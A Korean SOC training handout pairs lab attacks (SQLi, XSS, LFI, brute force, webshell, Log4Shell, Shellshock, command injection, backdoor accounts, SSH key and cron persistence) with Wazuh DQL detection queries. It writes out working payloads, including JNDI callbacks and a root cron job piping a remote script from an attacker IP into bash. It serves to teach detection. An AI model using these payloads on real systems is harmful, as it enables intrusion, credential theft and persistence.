# Module 01 해설 — Wazuh 위협 탐지 DQL 예시집 (kt66 실행 검증판)

모든 실습을 2026-10-31 kt66(Wazuh 4.10.0)에서 직접 실행하고 결과를 확인했다. 공격은 공격자 VM `192.168.0.202`(Ubuntu 22.04)에서, Windows RDP 공격만 kt66 내부 공격 컨테이너(`ssh -p 2202 ccc@<kt66 호스트>`)에서 실행했다.

- 결과 건수는 검증 당시 값이다. 같은 명령을 다시 실행하면 건수는 달라질 수 있지만 '찾힌다/안 찾힌다'는 같다.
- **인덱스**: 표시가 없으면 `wazuh-alerts-*`. `wazuh-archives-*` 는 룰 레벨 0 이벤트까지 저장된 아카이브(따라하기 슬라이드에서 인덱스 패턴을 만든다).
- 비밀번호는 강사가 안내한다(문서에 적지 않음).

## 웹 위협 (1~15)

### 01. SQL 인젝션

- **결과**: 12 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://dvwa.ccc.com/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit"
sqlmap -u "http://dvwa.ccc.com/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --technique=B --flush-session
```
- **구문 풀이**
  - `curl -s -o /dev/null -w "HTTP %{http_code}"` — 응답 본문은 버리고(-o /dev/null) 상태 코드만 출력(-w). 공격이 막혔는지(403) 통했는지(200)를 바로 본다
  - `id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--` — %27 = 작은따옴표('), %20 = 공백. 원래 쿼리를 '로 끊고 UNION SELECT 로 users 표의 계정·암호를 붙여 꺼내려는 구문, -- 는 뒤를 주석 처리
  - `sqlmap -u URL --batch --technique=B --flush-session` — SQLi 자동 점검 도구. --batch 질문에 기본값 자동 응답, --technique=B 참/거짓(Boolean) 기법만, --flush-session 이전 결과 무시
- **DQL**
```
rule.id:(31103 or 31161) OR data.url:(*union* or *select* or *%27* or *1=1* or *sleep\(*)
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: *sleep(* 의 '(' 는 DQL 특수문자 → *sleep\(* 로 이스케이프해야 검색이 실행된다
  - 원본 DQL: `rule.id:(31103 or 31161) OR data.url:(*union* or *select* or *%27* or *1=1* or *sleep(*)`
- **읽는 법**
  - data.url 에 UNION·SELECT·%27 가 보이면 SQLi 시도. 31103 은 Wazuh 가 URL 을 정규식으로 검사해 붙인 룰
  - data.id(응답 코드) 403 = WAF(ModSecurity)가 차단. 200 이면 통과 → 11번(31106)으로 이어서 확인
  - sqlmap 은 짧은 시간에 수십 건을 보내므로 같은 IP·같은 초에 몰린 행이 자동화 도구의 흔적

### 02. XSS

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://dvwa.ccc.com/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://dvwa.ccc.com/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(1)%3E"
```
- **구문 풀이**
  - `name=%3Cscript%3Ealert(1)%3C/script%3E` — %3C = <, %3E = >. 브라우저가 실행할 <script>alert(1)</script> 를 파라미터에 넣는다 (반사형 XSS)
  - `%3Cimg%20src=x%20onerror=alert(1)%3E` — <script> 를 막는 필터를 피하는 변형 — 없는 이미지를 불러 오류가 나면 onerror 의 코드가 실행된다
- **DQL**
```
rule.id:31105 OR data.url:(*\<script* or *%3Cscript* or *onerror* or *javascript\:*)
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: *<script* 의 '<', *javascript:* 의 ':' 이 특수문자 → *\<script*, *javascript\:* 로 이스케이프
  - 원본 DQL: `rule.id:31105 OR data.url:(*<script* or *%3Cscript* or *onerror* or *javascript:*)`
- **읽는 법**
  - rule.id 31105(XSS attempt)가 두 요청 모두에 붙었다
  - data.url 이 노란색 = DQL 의 와일드카드 조건(*%3Cscript*, *onerror*)과 일치한 부분
  - 응답 403: dvwa 는 WAF 가 차단 모드라 페이로드가 사용자 브라우저까지 가지 못했다

### 03. 디렉터리 트래버설 / LFI

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" --path-as-is "http://dvwa.ccc.com/vulnerabilities/fi/?page=../../../../etc/passwd"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://dvwa.ccc.com/vulnerabilities/fi/?page=php://filter/resource=index.php"
```
- **구문 풀이**
  - `--path-as-is` — curl 은 기본으로 ../ 를 정리해서 보낸다. 이 옵션이 있어야 ../../../../etc/passwd 가 서버까지 그대로 간다
  - `page=../../../../etc/passwd` — ../ 는 '상위 폴더'. 여러 번 올라가 웹 폴더 밖의 /etc/passwd(계정 목록)를 읽으려는 시도
  - `page=php://filter/resource=index.php` — PHP 의 특수 주소(php://)로 소스 코드를 그대로 읽어 내는 LFI 변형
- **DQL**
```
rule.id:31104 OR data.url:(*../* or *..%2F* or *..%5C* or *etc/passwd* or *php\://*)
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: *php://* 의 ':' → *php\://* 로 이스케이프
  - 원본 DQL: `rule.id:31104 OR data.url:(*../* or *..%2F* or *..%5C* or *etc/passwd* or *php://*)`
- **읽는 법**
  - rule.id 31104(Common web attack) — 경로 이동 문자열을 룰이 잡았다
  - 403 이면 시도 단계. 200 이면 파일이 읽혔을 수 있으니 응답 크기(full_log 의 숫자)를 함께 본다

### 04. 웹 스캐너 / 디렉터리 브루트포싱

- **결과**: 16 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
dirb http://dvwa.ccc.com/ /usr/share/dirb/wordlists/common.txt -S -r 2>&1 | head -12
gobuster -m dir -u http://dvwa.ccc.com/ -w /usr/share/dirb/wordlists/common.txt -q 2>&1 | head -6
nikto -h http://dvwa.ccc.com/ -maxtime 60s 2>&1 | head -10
```
- **구문 풀이**
  - `dirb URL /usr/share/dirb/wordlists/common.txt -S -r` — 사전(common.txt)의 경로 4,600여 개를 차례로 요청. -S 진행 표시 생략, -r 하위 폴더로 재귀하지 않음
  - `gobuster -m dir -u URL -w 사전 -q` — 같은 일을 하는 고속 도구. Ubuntu 22.04 의 gobuster(v2)는 -m dir 문법 (v3 이상은 gobuster dir …)
  - `nikto -h URL -maxtime 60s` — 알려진 취약 경로·설정 수천 개를 점검하는 웹 스캐너. 실습이라 60초만
- **DQL**
```
rule.id:31151 OR (data.id:404 AND data.srcip:*)
```
- **읽는 법**
  - rule.id 31151 = '같은 IP 에서 400번대 오류가 짧은 시간에 여러 번' — Wazuh 가 IP 별로 이미 세어 준 결과
  - 왼쪽 data.srcip 필드의 Visualize → 상위 IP 가 곧 스캐너
  - 개별 404/403 행은 정상 사용자에게도 생기므로 빈도 룰부터 본다

### 05. 스캐너 도구 User-Agent

- **결과**: 233 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -v -o /dev/null -A "sqlmap/1.6.4#stable (https://sqlmap.org)" http://dvwa.ccc.com/ 2>&1 | grep -E "^> (GET|User-Agent)|^< HTTP"
curl -s -v -o /dev/null -A "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000003)" http://dvwa.ccc.com/ 2>&1 | grep -E "^> (GET|User-Agent)|^< HTTP"
python3 -c "import requests; print(requests.get('http://dvwa.ccc.com/').status_code)"
```
- **구문 풀이**
  - `curl -v -A "sqlmap/1.6.4#stable …"` — -A 로 User-Agent 를 도구 기본값과 똑같이 보냄. -v 로 실제 보낸 헤더(> User-Agent:)를 화면에 출력
  - `python3 -c "import requests; …"` — 파이썬 requests 라이브러리의 기본 User-Agent(python-requests/x.y)도 자동화 흔적
- **DQL**
```
full_log:(sqlmap or nikto or nmap or masscan or zgrab or dirbuster or gobuster or "python-requests")
```
- **읽는 법**
  - full_log 는 원본 로그 한 줄. 액세스 로그의 마지막 따옴표 안이 User-Agent
  - full_log 는 text 필드라 sqlmap·nikto 같은 단어 단위로 검색된다 (대소문자 무시)
  - 헬스체크처럼 정상 자동화도 있으니 출발지 IP 로 예외를 둔다

### 06. 웹 로그인 브루트포스

- **결과**: 12 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
hydra -l admin -P ~/lab/pw.txt -t 4 dvwa.ccc.com http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:failed" 2>&1 | tail -6
```
- **구문 풀이**
  - `hydra -l admin -P ~/lab/pw.txt -t 4` — 계정 admin 하나에 암호 사전(pw.txt)을 대입. -t 4 = 동시 4개 연결
  - `http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:failed"` — '경로:보낼 본문:실패 판정 문자열'. ^USER^·^PASS^ 자리에 값을 넣어 POST, 응답에 failed 가 있으면 실패로 판단
- **DQL**
```
data.protocol:POST AND data.url:(*login* or *wp-login* or *signin* or *admin*) AND data.id:(200 or 302 or 401 or 403)
```
- **원본과 달라진 점**: 성공을 놓치지 않도록 응답 코드에 302 를 추가: data.id:(200 or 302 or 401 or 403)
  - 원본 DQL: `data.protocol:POST AND data.url:(*login* or *wp-login* or *signin* or *admin*) AND data.id:(200 or 401 or 403)`
- **읽는 법**
  - data.protocol POST + data.url 이 로그인 경로 + 같은 IP 반복 = 웹 로그인 브루트포스
  - 로그인 성공은 보통 302(다른 페이지로 이동). 실패 화면 재표시는 200, 차단은 403
  - 기본 룰이 없으므로 DQL 로 조건을 조합하고 data.srcip 로 Visualize 해 IP 별로 센다

### 07. 웹셸 업로드와 실행

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker exec kt66-web sh -c 'echo "<?php system($_GET["cmd"]); ?>" > /var/www/html/uploads/shell.php'
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://192.168.0.189/uploads/shell.php?cmd=id"
curl -s "http://192.168.0.189/uploads/shell.php?cmd=id"   # 응답 본문
```
- **구문 풀이**
  - `<?php system($_GET["cmd"]); ?>` — 가장 짧은 웹셸 — 주소의 cmd= 값을 서버 명령으로 실행한다
  - `/var/www/html/uploads/shell.php` — 취약한 업로드 기능으로 웹 폴더에 올라간 상황을 강사가 흉내 (FIM 이 /var/www 를 실시간 감시)
  - `curl "http://192.168.0.189/uploads/shell.php?cmd=id"` — 웹셸 실행 시도. kt66 의 web 은 WAF(프록시)라 PHP 가 없어 실행되지 않지만 요청은 로그에 남는다
- **DQL**
```
(syscheck.event:added AND syscheck.path:*www* AND syscheck.path:(*.php or *.jsp or *.aspx)) OR (data.url:*upload* AND data.url:(*cmd=* or *exec=* or *system\(*))
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: *system(* 의 '(' → *system\(*. 업로드 경로는 쓰기 가능한 /var/www/html/uploads (랜딩 사이트 폴더는 읽기 전용)
  - 원본 DQL: `(syscheck.event:added AND syscheck.path:*www* AND syscheck.path:(*.php or *.jsp or *.aspx)) OR (data.url:*upload* AND data.url:(*cmd=* or *exec=* or *system(*))`
- **읽는 법**
  - rule.id 554 = FIM 이 웹 폴더에 새 .php 파일이 생긴 것을 감지 (syscheck.path)
  - 같은 파일을 매니저가 VirusTotal 에 조회 → 87105 '26 engines detected' (55번 실습과 연결)
  - access.log 쪽에서는 data.url 의 uploads·cmd= 로 실행 시도를 찾는다

### 08. Log4Shell

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'User-Agent: ${jndi:ldap://192.168.0.202:1389/a}' "http://dvwa.ccc.com/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%2Fa%7D"
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.202:1389/b}' -A '${jndi:rmi://192.168.0.202:1099/c}' http://dvwa.ccc.com/
```
- **구문 풀이**
  - `-H 'User-Agent: ${jndi:ldap://192.168.0.202:1389/a}'` — Log4j 가 로그에 이 문자열을 쓰는 순간 ${…} 를 '해석'하며 공격자 LDAP 서버(1389)에 접속 → 원격 코드 실행
  - `q=%24%7Bjndi%3Aldap…%7D` — 같은 문자열을 URL 인코딩 (%24 = $, %7B = {, %3A = :, %2F = /)
  - `${${lower:j}ndi:…}` — 난독화 — ${lower:j} 를 Log4j 가 'j' 로 바꿔 읽으므로 'jndi' 라는 글자 없이도 동작
- **DQL**
```
full_log:*jndi* OR data.url:(*jndi* or *%24%7B* or *$\{*)
```
- **원본과 달라진 점**: 원본 DQL 문법 오류: *${* 의 '{' → *$\{*. 대상은 차단 모드인 dvwa (juice 는 200 이라 레벨 0 → 인덱스에 안 남음)
  - 원본 DQL: `full_log:*jndi* OR data.url:(*jndi* or *%24%7B* or *${*)`
- **읽는 법**
  - Wazuh 4.10 기본 룰셋에는 Log4Shell 전용 룰이 없다 → 403(차단)처럼 '400번대 오류' 룰에 걸린 줄만 alerts 에 남는다
  - full_log 에서 jndi·ldap 뒤의 IP:포트가 공격자 콜백 서버 → 방화벽에서 그 IP 로의 바깥 연결이 있었는지 확인

### 09. Shellshock

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" -A '() { :; }; /bin/bash -c "id"' http://juice.ccc.com/cgi-bin/test.cgi
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H 'Referer: () { :; }; /bin/bash -c "cat /etc/passwd"' http://dvwa.ccc.com/cgi-bin/status
```
- **구문 풀이**
  - `-A '() { :; }; /bin/bash -c "id"'` — () { :; }; = 빈 함수 정의. 취약한 Bash 는 이 뒤에 붙은 /bin/bash -c "id" 까지 실행해 버린다
  - `-H 'Referer: () { :; }; …'` — User-Agent 말고 다른 헤더(Referer)로도 같은 공격 — CGI 는 모든 헤더를 환경 변수로 넘긴다
- **DQL**
```
rule.id:(31166 or 31167 or 31168 or 31169) OR rule.description:*Shellshock*
```
- **원본과 달라진 점**: 원본 DQL 은 결과 0건: rule.description 은 keyword(정확히 일치) 필드라 'shellshock' 한 단어로 안 걸리고, full_log:"() {" 는 기호가 분석기에서 지워져 빈 검색이 된다 → rule.id:(31166 or 31167 or 31168 or 31169) OR rule.description:*Shellshock*
  - 원본 DQL: `rule.description:shellshock OR full_log:"() {"`
- **읽는 법**
  - 31168(레벨 15, 'Shellshock attack detected') = 응답 200, 31166(레벨 6, 'attempt') = 응답 400번대
  - full_log 에 실행하려던 명령(/bin/bash -c …)이 그대로 남는다

### 10. OS 명령 삽입

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://juice.ccc.com/rest/track-order/1%3Bid"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://dvwa.ccc.com/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd"
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST -d "ip=127.0.0.1;id&Submit=Submit" http://dvwa.ccc.com/vulnerabilities/exec/
```
- **구문 풀이**
  - `1%3Bid` — %3B = ; — 앞 명령 뒤에 id 를 덧붙여 서버에서 함께 실행시키려는 시도
  - `ip=127.0.0.1%7Ccat%20/etc/passwd` — %7C = | (파이프) — ping 대상 대신 cat /etc/passwd 출력을 받으려는 시도
  - `-X POST -d "ip=127.0.0.1;id"` — 같은 공격을 POST 본문에 넣으면 액세스 로그에는 경로만 남고 페이로드가 안 보인다
- **DQL**
```
data.url:(*%3Bid* or *;id* or *%7Cid* or *%7Ccat* or *whoami* or *cat%20* or *wget%20* or *curl%20* or *%24%28* or *nc%20-e*)
```
- **원본과 달라진 점**: dvwa 의 GET 변형을 찾도록 *%7Ccat* 추가
  - 원본 DQL: `data.url:(*%3Bid* or *;id* or *%7Cid* or *whoami* or *cat%20* or *wget%20* or *curl%20* or *%24%28* or *nc%20-e*)`
- **읽는 법**
  - GET 페이로드는 data.url 에서 찾힌다 (31104 등)
  - POST 본문 공격은 ModSecurity 감사 로그(modsec_audit.log)에만 남는다. 기본 룰셋에 이 JSON 용 룰이 없어 알림이 안 뜬다 → 아카이브 인덱스에서 data.audit_data.messages 로 확인

### 11. 공격이 200으로 성공한 요청

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://juice.ccc.com/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://juice.ccc.com/?q=%3Cscript%3Ealert(1)%3C/script%3E"
```
- **구문 풀이**
  - `juice.ccc.com` — juice 사이트만 WAF 가 '탐지 전용(DetectionOnly)' — 경고만 남기고 막지 않는다 (다른 사이트는 차단 모드)
  - `/rest/products/search?q=%27))%20UNION%20SELECT …` — juice shop 의 실제 SQLi 지점에 UNION 을 넣어 사용자 표를 꺼내는 공격
- **DQL**
```
rule.id:31106 OR (rule.groups:attack AND data.id:200)
```
- **읽는 법**
  - 31106 = 공격 룰에 걸린 요청인데 응답이 200 — 사고 대응 1순위
  - data.url 로 어떤 페이로드가 통했는지, 같은 IP 의 다음 행동을 시간순으로 이어서 본다

### 12. 서버 오류(5xx) 급증

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} " "http://juice.ccc.com/rest/products/search?q=%27$i"; done; echo
```
- **구문 풀이**
  - `for i in $(seq 1 20); do curl …q=%27$i; done` — 작은따옴표가 든 값을 20번 보내 서버 오류(500)를 반복 유발 — 퍼징 흉내
- **DQL**
```
data.id:5* OR rule.id:(31152 or 31153 or 31154)
```
- **읽는 법**
  - data.id 는 문자열이라 >= 범위 검색이 안 된다 → 5* 와일드카드
  - 31152~31154 = 같은 IP 의 500번대 다발. 히스토그램에서 막대가 솟은 구간을 클릭해 좁힌다

### 13. 비정상 HTTP 메서드

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
for m in PUT TRACE PROPFIND DELETE; do curl -X $m http://juice.ccc.com/x; done
```
- **구문 풀이**
  - `curl -X PUT|TRACE|PROPFIND|DELETE` — -X 로 HTTP 메서드를 바꿔 보낸다. PUT 파일 올리기, TRACE 요청 반사(헤더 탈취), PROPFIND WebDAV 탐색
- **DQL**
```
data.protocol:* AND NOT data.protocol:(GET or POST or HEAD or OPTIONS)
```
- **읽는 법**
  - 일반 웹사이트는 GET·POST·HEAD(·OPTIONS)만 쓴다 → 그 외 메서드는 탐색·공격 신호
  - PUT + 201 이면 파일 업로드 성공 → 바로 FIM(554) 결과와 맞춰 본다

### 14. 관리 페이지 외부 접근

- **결과**: 5 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
for p in admin/ phpmyadmin/ wp-admin/ manager/html console; do curl http://ccc.com/$p; done
```
- **구문 풀이**
  - `for p in admin/ phpmyadmin/ wp-admin/ …` — 자주 노리는 관리자 경로를 차례로 요청 (없는 경로라 404)
- **DQL**
```
data.url:(*phpmyadmin* or *wp-admin* or *manager/html* or */admin/* or *console*) AND NOT data.srcip:10.20.*
```
- **원본과 달라진 점**: 원본의 NOT data.srcip:(10.* or 192.168.* …) 는 kt66 공격자(192.168.0.202)까지 지워 0건 → NOT data.srcip:10.20.*. 대상은 404 를 주는 ccc.com (juice 는 없는 경로도 200 → 레벨 0 이라 인덱스에 안 남음)
  - 원본 DQL: `data.url:(*phpmyadmin* or *wp-admin* or *manager/html* or */admin/* or *console*) AND NOT data.srcip:(10.* or 192.168.* or 172.16.* or 127.0.0.1)`
- **읽는 법**
  - kt66 의 '외부'는 공격자 VM(192.168.0.x)과 kt66 ext 망(10.20.30.x) 모두 → kt66 내부 대역 10.20.* 만 제외
  - 200 이면 관리 페이지가 외부에 노출된 것 — 즉시 접근 제한

### 15. 비정상적으로 긴 URL

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://juice.ccc.com/?a=$(python3 -c 'print("A"*8000)')"
```
- **구문 풀이**
  - `?a=$(python3 -c 'print("A"*8000)')` — $( ) 안의 명령 결과(A 8,000개)를 그대로 URL 에 넣는다
- **DQL**
```
rule.id:31115
```
- **원본과 달라진 점**: 원본 재현은 'A' 5,000개 → 7,900바이트에 못 미쳐 31115 가 안 뜬다. 8,000개로 변경 (Apache 요청 줄 한도 8,190 바이트 안)
- **읽는 법**
  - 31115(레벨 13)는 로그 한 줄이 7,900바이트를 넘을 때만 붙는다 (룰의 maxsize=7900)
  - data.url 을 펼쳐 같은 문자 반복(AAAA…, %90%90)이나 인코딩 덩어리가 있으면 익스플로잇 시도

## 리눅스 시스템 위협 (16~30, 58)

### 16. SSH 브루트포스

- **결과**: 10 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
hydra -l ccc -P ~/lab/pw.txt -t 4 ssh://192.168.0.189:2204 2>&1 | tail -3
```
- **구문 풀이**
  - `hydra -l ccc -P ~/lab/pw.txt -t 4 ssh://192.168.0.189:2204` — 계정 ccc 에 암호 사전 12개를 동시 4개 연결로 대입. :2204 는 호스트가 bastion 의 SSH(22)로 넘겨주는 포트
- **DQL**
```
rule.id:(5712 or 5720 or 5763) OR (rule.groups:authentication_failed AND decoder.name:sshd)
```
- **읽는 법**
  - 5760·5716 = 개별 인증 실패, 5763·5720·5712 = Wazuh 가 같은 IP 의 실패를 세어 '브루트포스'로 묶은 빈도 룰
  - predecoder.hostname:bastion 또는 agent.name:bastion 으로 서버를 거른다
  - 이 공격 직후 bastion 이 공격자 IP 를 3분 차단(58번 Active Response) — hydra 가 'timed out' 으로 끝나는 이유

### 17. 존재하지 않는 계정으로 로그인 시도

- **결과**: 9 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
cat ~/lab/users.txt | tr '\n' ' '; echo
hydra -L ~/lab/users.txt -p x -t 4 ssh://192.168.0.189:2204 2>&1 | tail -3
```
- **구문 풀이**
  - `hydra -L ~/lab/users.txt -p x` — -L 계정 '목록'(admin, oracle, test …), -p 고정 암호 x. 어떤 계정이 실제로 있는지 알아내는 '계정 열거'
- **DQL**
```
rule.id:5710
```
- **읽는 법**
  - 5710 = sshd 가 'Invalid user' 를 남긴 경우 (없는 계정)
  - data.srcuser 를 Visualize → 공격자가 쓰는 사전이 보인다. 실제 계정명(ccc 등)이 섞이면 내부 정보가 샌 것

### 18. 브루트포스 후 로그인 성공

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
hydra -l ccc -P ~/lab/pw2.txt -t 1 ssh://192.168.0.189:2204
ssh -p 2204 ccc@192.168.0.189 'hostname; whoami'      # 비밀번호 ccc
```
- **구문 풀이**
  - `pw2.txt = 123456, password, qwerty, ccc` — 틀린 암호 3개 + 실제 암호. 8회 미만이라 자동 차단(58번)에 걸리지 않고 성공까지 간다
  - `ssh -p 2204 ccc@192.168.0.189 'hostname; whoami'` — 알아낸 암호로 실제 로그인
- **DQL**
```
rule.id:5715 AND NOT data.srcip:10.20.*
```
- **원본과 달라진 점**: 원본의 NOT data.srcip:(10.* or 192.168.* …) 는 kt66 공격자까지 지움 → NOT data.srcip:10.20.*
  - 원본 DQL: `rule.id:5715 AND NOT data.srcip:(10.* or 192.168.* or 172.16.*)`
- **읽는 법**
  - 5715 = 로그인 성공. 바로 앞에 같은 IP 의 실패(5760)가 있으면 '추측 끝에 성공' = 계정 탈취
  - 나온 IP 를 복사해 data.srcip:192.168.0.202 로 다시 검색 → 실패 수십 건 뒤 성공 1건이 보인다 (피벗)

### 19. root 계정 직접 SSH 로그인

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker exec kt66-bastion sh -c "echo root:Kt66Root! | chpasswd; sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config; kill -HUP 1"
ssh -p 2204 root@192.168.0.189 'whoami; id'      # 비밀번호 Kt66Root!
sudo docker exec kt66-bastion sh -c "sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config; passwd -l root; kill -HUP 1"
```
- **구문 풀이**
  - `sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' …` — [강사 준비] bastion 은 원래 root 직접 로그인 금지 — 실습을 위해 잠시 허용하고 끝나면 되돌린다
  - `ssh -p 2204 root@192.168.0.189` — 공격자가 root 로 바로 로그인 — 누가 했는지 추적이 안 되는 위험한 접속
- **DQL**
```
rule.id:5715 AND data.dstuser:root
```
- **읽는 법**
  - 5715 + data.dstuser:root. 결과가 있으면 sshd_config 의 PermitRootLogin 이 열려 있다는 뜻
  - 정상 운영에서는 0건이어야 한다 — 0건 자체가 '정책 준수'의 증거

### 20. sudo 권한 상승

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189 'sudo -i id; sudo cat /etc/shadow | head -2'
```
- **구문 풀이**
  - `sudo -i id` — root 셸로 들어가 id 실행
  - `sudo cat /etc/shadow` — root 만 읽을 수 있는 암호 해시 파일 열람
- **DQL**
```
rule.groups:sudo AND rule.id:(5401 or 5402 or 5403)
```
- **읽는 법**
  - 5402 = root 로 sudo 성공, 5403 = 그 사용자가 sudo 를 처음 씀
  - data.command 에 실제 실행 명령. bash·sh·vi 같은 셸 획득 명령은 바로 조사
  - kt66 bastion 의 ccc 는 비밀번호 없이 sudo(NOPASSWD)라 5401(암호 3회 실패)은 생기지 않는다

### 21. 계정·그룹 생성과 삭제

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189 'sudo useradd -m -s /bin/bash backdoor; sudo usermod -aG sudo backdoor; id backdoor'
ssh -p 2204 ccc@192.168.0.189 'sudo userdel -r backdoor; id backdoor'
```
- **구문 풀이**
  - `sudo useradd -m -s /bin/bash backdoor` — 홈 폴더(-m)와 셸(-s)을 가진 새 계정 생성
  - `sudo usermod -aG sudo backdoor` — sudo 그룹에 추가(-aG) → 관리자 권한 백도어
  - `sudo userdel -r backdoor` — 흔적 지우기 — 계정 삭제(5904)도 기록된다
- **DQL**
```
rule.groups:adduser OR rule.id:(5901 or 5902 or 5904 or 5555)
```
- **읽는 법**
  - 5902 사용자 추가 → 그룹 변경 → 5904 삭제가 시간순으로 보인다
  - full_log 에 새 계정 이름·UID. UID 0 이거나 sudo·wheel 그룹이면 즉시 대응

### 22. 핵심 계정 파일 변조 (FIM)

- **결과**: 3 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189 'echo "ccc ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/99-kt66-lab'
ssh -p 2204 ccc@192.168.0.189 'sudo rm /etc/sudoers.d/99-kt66-lab'    # 원복
```
- **구문 풀이**
  - `echo "ccc ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/99-kt66-lab` — sudoers 에 '암호 없이 모든 명령' 규칙을 직접 심는다 (tee = 화면 출력 + 파일 쓰기)
- **DQL**
```
rule.groups:syscheck AND syscheck.path:(/etc/passwd or /etc/shadow or /etc/sudoers or /etc/sudoers.d/* or /etc/group)
```
- **원본과 달라진 점**: kt66 보강: /etc/shadow·/etc/sudoers·/var/spool/cron 을 실시간 감시에 추가 (원본은 미감시)
- **읽는 법**
  - 554(추가)·550(변경)·553(삭제) — FIM 은 해시가 바뀐 결과를 보므로 어떤 명령으로 바꿨든 잡힌다
  - 21번 useradd 가 바꾼 /etc/passwd·/etc/shadow 변경도 같이 보인다 — 21번 시각과 맞으면 정상 useradd, 아니면 수동 변조

### 23. SSH 키 지속화

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh-keygen -t ed25519 -N '' -C 'evil@attacker' -f ~/lab/kt66_lab_key
ssh -p 2204 ccc@192.168.0.189 "echo '<공개키>' >> ~/.ssh/authorized_keys"
ssh -i ~/lab/kt66_lab_key -p 2204 ccc@192.168.0.189 'whoami'    # 비밀번호 묻지 않음
```
- **구문 풀이**
  - `ssh-keygen -t ed25519 -N '' -C 'evil@attacker'` — 공격자 키쌍 생성(-N '' 암호 없음, -C 주석)
  - `echo '<공개키>' >> ~/.ssh/authorized_keys` — 피해 계정에 공격자 공개키 등록 → 이후 비밀번호 없이 접속 (지속화)
- **DQL**
```
rule.groups:syscheck AND syscheck.path:*authorized_keys* AND syscheck.event:(added or modified)
```
- **읽는 법**
  - syscheck.path 에 authorized_keys, syscheck.event 에 added/modified
  - syscheck.diff(설정 시)에서 추가된 키의 주석(evil@attacker)을 확인

### 24. cron 지속화

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh -p 2204 ccc@192.168.0.189 'echo "* * * * * root curl -s http://192.168.0.202:8000/x.sh | bash" | sudo tee /etc/cron.d/kt66-update'
ssh -p 2204 ccc@192.168.0.189 'sudo rm /etc/cron.d/kt66-update'    # 원복
```
- **구문 풀이**
  - `* * * * * root curl -s http://…/x.sh | bash` — cron 시간 칸 5개(분 시 일 월 요일)가 모두 * = 매분. root 로 원격 스크립트를 받아 실행
- **DQL**
```
rule.groups:syscheck AND syscheck.path:(/etc/cron* or /var/spool/cron* or /etc/systemd/system/*.timer)
```
- **읽는 법**
  - /etc/cron.d 새 파일(554)과 내용(syscheck.diff)
  - diff 에 curl … | bash, /dev/tcp, base64 -d 가 보이면 악성

